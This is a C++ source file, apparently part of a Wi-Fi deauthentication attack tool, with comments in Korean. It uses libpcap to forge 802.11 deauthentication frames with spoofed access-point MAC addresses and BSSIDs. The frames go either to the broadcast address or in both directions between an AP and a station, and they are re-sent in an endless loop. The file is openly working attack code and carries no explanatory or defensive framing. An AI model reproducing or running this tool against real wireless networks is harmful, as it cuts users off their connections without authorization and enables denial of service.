#include <pcap.h>
#include <thread>
#include "attack_frame.h"
#include "utils.h"
#include <unistd.h>
#include <cstring>

void send_packet(Deauthentication_Frame frame, pcap_t *handle)
{
    printf("%d\n", sizeof(Deauthentication_Frame));
    printf("%x\n", frame.radiotap_header.antenna_signal2);
    while(1)
    {
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&frame), sizeof(Deauthentication_Frame));

        sleep(5); 

    }
    pcap_close(handle);
}

void send_deauth_broadcast(Deauthentication_Frame frame, pcap_t *handle, char *argv[])
{
    //destination mac 바꾸기
    printf("send: %d\n", frame.radiotap_header.header_length);
    uint8_t broadcast_mac_address[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    memcpy(frame.deauthentication_main_frame.destination_address, broadcast_mac_address, 6);

    // source 맥 바꾸기
    char source_mac_bytes[6] = {0};
    convert_mac_address(argv[2], source_mac_bytes);
    // uint8_t source_mac_bytes[6] = {0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff};

    memcpy(frame.deauthentication_main_frame.source_address, source_mac_bytes, 6);

    // BSSID 바꾸기
    memcpy(frame.deauthentication_main_frame.bss_id, source_mac_bytes, 6);

    send_packet(frame, handle);
    
}

void send_deauth_to_bidirection(Deauthentication_Frame frame, pcap_t *handle, char *argv[])
{
    // AP(source) -> Station(destination) 설정
    char source_mac[6] = {0};
    char destination_mac[6] = {0};
    convert_mac_address(argv[2], source_mac);
    convert_mac_address(argv[3], destination_mac);

    memcpy(frame.deauthentication_main_frame.source_address, source_mac, 6);
    memcpy(frame.deauthentication_main_frame.destination_address, destination_mac, 6);
    memcpy(frame.deauthentication_main_frame.bss_id, source_mac, 6);

    // Station(source) -> AP(destination) 설정
    Deauthentication_Frame frame_reverse = frame;  // 복사본 생성
    char source_mac2[6] = {0};
    char destination_mac2[6] = {0};
    convert_mac_address(argv[3], source_mac2);  // 주소 반전
    convert_mac_address(argv[2], destination_mac2);
    memcpy(frame_reverse.deauthentication_main_frame.source_address, source_mac2, 6);
    memcpy(frame_reverse.deauthentication_main_frame.destination_address, destination_mac2, 6);
    memcpy(frame_reverse.deauthentication_main_frame.bss_id, destination_mac2, 6);

    std::thread thread_ap_to_station(send_packet, frame, handle);
    std::thread thread_station_to_ap(send_packet, frame_reverse, handle);

    thread_ap_to_station.join();
    thread_station_to_ap.join();
}


void send_auth(Deauthentication_Frame frame, pcap_t *handle, char *argv[])
{

}
